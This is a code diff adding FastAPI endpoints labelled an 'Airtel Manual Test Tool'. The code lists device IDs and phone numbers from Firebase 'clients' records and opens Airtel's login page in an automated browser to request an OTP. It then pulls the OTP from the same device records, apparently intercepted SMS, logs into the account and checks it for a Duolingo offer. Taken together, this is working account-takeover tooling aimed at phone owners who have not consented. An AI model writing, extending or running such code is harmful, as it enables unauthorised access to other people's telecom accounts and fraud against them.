@@ -4290,6 +4290,281 @@ async def download_airtel_success():
     )
 
 
+# ─── Airtel Manual Test Tool ──────────────────────────────────────────────────
+
+_manual_sessions = {}  # session_id → {status, otp, page, context, phone, device_id, fb_url, screenshots}
+
+@app.get("/api/airtel-manual/devices")
+async def airtel_manual_devices():
+    """Scan all Firebase DBs and return device → phone list."""
+    firebase_dbs = config.get("firebase_dbs", [])
+    if not firebase_dbs:
+        firebase_dbs = [{"url": u, "key": ""} for u in config.get("firebase_urls", [])]
+    if not firebase_dbs:
+        return {"error": "No Firebase DBs configured", "devices": []}
+
+    devices = []
+    for db in firebase_dbs:
+        fb_url = clean_firebase_url((db.get("url") or "").strip())
+        if not fb_url:
+            continue
+        key = (db.get("key") or "").strip()
+        _url_key_map[fb_url] = key
+        try:
+            async with state.http_session.get(fb_url_with_auth(fb_url, "clients.json"), timeout=20) as resp:
+                if resp.status != 200:
+                    continue
+                clients = await resp.json()
+                if not isinstance(clients, dict):
+                    continue
+                for dev_id, dev_data in clients.items():
+                    phone_raw = ""
+                    if isinstance(dev_data, dict):
+                        phone_raw = (dev_data.get("phone") or dev_data.get("number") or dev_data.get("mobile") or "")
+                    phone_clean = str(phone_raw).strip().lstrip("+").lstrip("91")
+                    if len(phone_clean) == 10:
+                        devices.append({
+                            "device_id": dev_id,
+                            "phone": phone_clean,
+                            "fb_url": fb_url,
+                            "db_name": fb_url.split("//")[1].split(".")[0] if "//" in fb_url else fb_url,
+                        })
+        except Exception as e:
+            pass
+
+    return {"devices": devices, "count": len(devices)}
+
+
+@app.post("/api/airtel-manual/start")
+async def airtel_manual_start(request: Request):
+    """Launch browser, navigate to Airtel login, send OTP for a phone."""
+    body = await request.json()
+    phone = str(body.get("phone", "")).strip().lstrip("+").lstrip("91")
+    device_id = body.get("device_id", "")
+    fb_url = body.get("fb_url", "")
+
+    if not phone or not device_id or not fb_url:
+        return {"error": "phone, device_id, fb_url required"}
+
+    session_id = str(uuid.uuid4())[:8]
+    _manual_sessions[session_id] = {
+        "status": "starting", "phone": phone, "device_id": device_id,
+        "fb_url": fb_url, "otp": None, "page": None, "context": None,
+        "log": [], "screenshots": []
+    }
+
+    async def run_session():
+        sess = _manual_sessions[session_id]
+        def log(msg):
+            sess["log"].append(msg)
+
+        try:
+            log("Taking Firebase snapshot...")
+            known_keys = await get_device_message_keys(fb_url, device_id)
+            log(f"Firebase snapshot: {len(known_keys)} existing messages")
+
+            browser = await get_airtel_browser()
+            try:
+                context = await browser.new_context(
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+                    viewport={"width": 1280, "height": 800},
+                )
+            except Exception:
+                state.airtel_browser = None
+                browser = await get_airtel_browser()
+                context = await browser.new_context(
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+                    viewport={"width": 1280, "height": 800},
+                )
+
+            page = await context.new_page()
+            sess["page"] = page
+            sess["context"] = context
+
+            log(f"Opening {AIRTEL_LOGIN_URL}...")
+            await page.goto(AIRTEL_LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
+            await asyncio.sleep(3)
+
+            # Screenshot 1
+            ss1 = os.path.join(DATA_DIR, f"manual_{session_id}_1_loaded.png")
+            await page.screenshot(path=ss1, full_page=True)
+            sess["screenshots"].append({"label": "Page loaded", "file": f"manual_{session_id}_1_loaded.png"})
+            log(f"Page loaded: {page.url}")
+
+            # Fill phone
+            phone_filled = False
+            for sel in ['input[placeholder*="mobile" i]', 'input[type="tel"]', 'input[maxlength="10"]',
+                        'input[name*="mobile" i]', 'input[id*="mobile" i]']:
+                try:
+                    el = page.locator(sel).first
+                    if await el.count() > 0:
+                        await el.wait_for(state="visible", timeout=3000)
+                        await el.fill(phone)
+                        phone_filled = True
+                        log(f"Phone filled ({sel})")
+                        break
+                except Exception:
+                    continue
+
+            if not phone_filled:
+                log("❌ Phone input not found")
+                sess["status"] = "error"
+                return
+
+            await asyncio.sleep(1)
+
+            # Click Send OTP
+            otp_sent = False
+            for sel in ['button:has-text("Send OTP")', 'button:has-text("SEND OTP")',
+                        'button:has-text("Get OTP")', 'button:has-text("GET OTP")',
+                        'button:has-text("Generate OTP")', 'button[type="submit"]']:
+                try:
+                    el = page.locator(sel).first
+                    if await el.count() > 0:
+                        await el.wait_for(state="visible", timeout=3000)
+                        await el.click()
+                        otp_sent = True
+                        log(f"OTP button clicked ({sel})")
+                        break
+                except Exception:
+                    continue
+
+            if not otp_sent:
+                log("❌ OTP button not found")
+                sess["status"] = "error"
+                return
+
+            # Screenshot 2
+            await asyncio.sleep(2)
+            ss2 = os.path.join(DATA_DIR, f"manual_{session_id}_2_otp_sent.png")
+            await page.screenshot(path=ss2, full_page=True)
+            sess["screenshots"].append({"label": "After OTP request", "file": f"manual_{session_id}_2_otp_sent.png"})
+
+            sess["status"] = "waiting_otp"
+            log("⏳ Waiting for OTP from Firebase (90s)...")
+
+            # Poll Firebase for OTP
+            try:
+                otp = await poll_for_otp(fb_url, device_id, known_keys, timeout=90, poll_interval=2.5)
+                sess["otp"] = otp
+                sess["status"] = "otp_received"
+                log(f"✅ OTP received: {otp}")
+            except asyncio.TimeoutError:
+                sess["status"] = "otp_timeout"
+                log("⏰ OTP timeout — enter manually if you received it")
+
+        except Exception as e:
+            sess["log"].append(f"❌ Error: {str(e)[:200]}")
+            sess["status"] = "error"
+
+    asyncio.create_task(run_session())
+    return {"session_id": session_id, "status": "starting"}
+
+
+@app.post("/api/airtel-manual/submit-otp")
+async def airtel_manual_submit_otp(request: Request):
+    """Enter OTP and navigate to Thanks page, return screenshot."""
+    body = await request.json()
+    session_id = body.get("session_id", "")
+    otp = str(body.get("otp", "")).strip()
+
+    sess = _manual_sessions.get(session_id)
+    if not sess:
+        return {"error": "Session not found"}
+    if not sess.get("page"):
+        return {"error": "Browser not ready"}
+
+    page = sess["page"]
+    sess["status"] = "submitting"
+    sess["log"].append(f"Submitting OTP: {otp}")
+
+    try:
+        # Fill OTP
+        otp_sel = ('input[type="tel"], input[type="number"], input[placeholder*="OTP" i], '
+                   'input[maxlength="6"], input[maxlength="4"]')
+        otp_inputs = await page.locator(otp_sel).all()
+        if len(otp_inputs) >= 4:
+            for i, digit in enumerate(otp[:len(otp_inputs)]):
+                await otp_inputs[i].fill(digit)
+                await asyncio.sleep(0.1)
+        else:
+            await page.locator(otp_sel).first.fill(otp)
+
+        await asyncio.sleep(1)
+
+        # Click LOGIN
+        for sel in ['button:has-text("LOGIN")', 'button:has-text("Login")',
+                    'button:has-text("Verify")', 'button:has-text("VERIFY")',
+                    'button:has-text("Submit")', 'button:has-text("Continue")']:
+            try:
+                el = page.locator(sel).first
+                if await el.count() > 0:
+                    await el.wait_for(state="visible", timeout=5000)
+                    await el.click()
+                    sess["log"].append(f"Clicked: {sel}")
+                    break
+            except Exception:
+                continue
+
+        await asyncio.sleep(3)
+        ss3 = os.path.join(DATA_DIR, f"manual_{session_id}_3_after_login.png")
+        await page.screenshot(path=ss3, full_page=True)
+        sess["screenshots"].append({"label": "After login", "file": f"manual_{session_id}_3_after_login.png"})
+
+        # Go to Thanks page
+        sess["log"].append("Navigating to airtel.in/thanks/...")
+        await page.goto(AIRTEL_THANKS_URL, wait_until="domcontentloaded", timeout=60000)
+        await asyncio.sleep(4)
+
+        ss4 = os.path.join(DATA_DIR, f"manual_{session_id}_4_thanks.png")
+        await page.screenshot(path=ss4, full_page=True)
+        sess["screenshots"].append({"label": "Thanks page", "file": f"manual_{session_id}_4_thanks.png"})
+
+        # Check for Duolingo
+        page_text = await page.inner_text("body")
+        has_duolingo = "duolingo" in page_text.lower()
+        sess["has_duolingo"] = has_duolingo
+        sess["log"].append(f"{'✅ Duolingo offer found!' if has_duolingo else '❌ No Duolingo offer on this number'}")
+        sess["status"] = "done"
+
+        # Close context
+        await sess["context"].close()
+        sess["page"] = None
+        sess["context"] = None
+
+    except Exception as e:
+        sess["log"].append(f"❌ Error: {str(e)[:200]}")
+        sess["status"] = "error"
+
+    return {"status": sess["status"], "log": sess["log"], "screenshots": sess["screenshots"],
+            "has_duolingo": sess.get("has_duolingo", False)}
+
+
+@app.get("/api/airtel-manual/status/{session_id}")
+async def airtel_manual_status(session_id: str):
+    sess = _manual_sessions.get(session_id)
+    if not sess:
+        return {"error": "Session not found"}
+    return {
+        "status": sess["status"],
+        "otp": sess.get("otp"),
+        "log": sess["log"],
+        "screenshots": sess["screenshots"],
+        "has_duolingo": sess.get("has_duolingo"),
+    }
+
+@app.get("/api/airtel-manual/screenshot/{filename}")
+async def airtel_manual_screenshot(filename: str):
+    from fastapi.responses import FileResponse
+    # Sanitize — only allow manual_* files
+    if not filename.startswith("manual_") or ".." in filename:
+        return Response(content="Not found", status_code=404)
+    path = os.path.join(DATA_DIR, filename)
+    if not os.path.exists(path):
+        return Response(content="Not found", status_code=404)
+    return FileResponse(path, media_type="image/png")
+
+
 # ─── Main ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
